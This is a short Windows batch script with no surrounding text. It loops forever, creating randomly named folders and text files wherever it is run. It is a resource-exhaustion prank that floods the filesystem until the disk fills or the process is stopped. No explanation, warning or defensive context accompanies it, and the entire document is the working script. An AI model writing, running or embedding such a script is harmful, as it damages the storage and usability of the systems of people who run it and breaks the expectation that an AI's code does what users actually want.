@echo off

:loop
    md %random%
    echo >%random%.txt

goto:loop
pause>nul